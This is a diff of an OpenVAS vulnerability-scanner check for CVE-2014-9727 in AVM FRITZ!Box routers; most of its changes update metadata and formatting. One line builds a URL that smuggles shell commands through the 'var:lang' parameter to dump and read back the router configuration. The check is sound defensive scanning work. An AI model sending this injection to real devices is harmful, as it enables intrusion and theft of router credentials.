@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_avm_fritz_box_02_14_remote.nasl 11413 2018-09-16 11:07:26Z cfischer $
+# $Id: gb_avm_fritz_box_02_14_remote.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)
 #
@@ -30,13 +30,13 @@ CPE = "cpe:/o:avm:fritz%21_os";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103912");
-  script_version("$Revision: 11413 $");
+  script_version("$Revision: 13994 $");
   script_bugtraq_id(74927, 65520);
   script_cve_id("CVE-2014-9727");
   script_name("Multiple AVM FRITZ!Box Multiple Vulnerabilities (remote check)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-16 13:07:26 +0200 (Sun, 16 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2014-03-10 11:07:20 +0100 (Mon, 10 Mar 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -58,7 +58,7 @@ if(description)
 
   script_tag(name:"summary", value:"AVM FRITZ!Box is prone to multiple vulnerabilities");
 
-  script_tag(name:"affected", value:"See the list at http://www.avm.de/de/Sicherheit/liste_update.html");
+  script_tag(name:"affected", value:"See the list provided by the vendor at the linked references.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -71,11 +71,17 @@ include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
-if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
-if( dir == "/" ) dir = "";
+if( ! port = get_app_port( cpe:CPE, service:"www" ) )
+  exit( 0 );
 
-file = get_vt_string() + "_" + rand();
+if( ! dir  = get_app_location( cpe:CPE, port:port ) )
+  exit( 0 );
+
+if( dir == "/" )
+  dir = "";
+
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"];
 url = dir + "/cgi-bin/webcm?var:lang=%26allcfgconv%20-C%20ar7%20-c%20-o%20/var/tmp/" + file + "%26%26%20cat%20/var/tmp/" + file;
 
 req = http_get( item:url, port:port );
